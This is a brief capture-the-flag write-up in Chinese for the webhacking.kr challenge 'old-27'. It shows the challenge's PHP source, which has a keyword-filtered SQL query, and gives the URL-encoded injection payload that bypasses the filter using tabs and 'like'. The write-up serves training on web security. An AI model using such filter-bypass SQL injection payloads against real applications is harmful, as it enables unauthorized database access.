# old-27_150

* 進到這一個網站可以看到斗大的提示 --- sql injection，以及 source code
    ```php=
    if($_GET['no']){
      $db = dbconnect();
      if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
      $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
      if($r['id']=="guest") echo("guest");
      if($r['id']=="admin") solve(27); // admin's no = 2
    }
    ```
* 這題很像是 old-18_100 的題目，所以我把 old-18 的 payload 稍微改一下 `2)%09or%09id%09like%27admin%27%09--%09` 就過了
* 要注意有過濾 = 以及 #
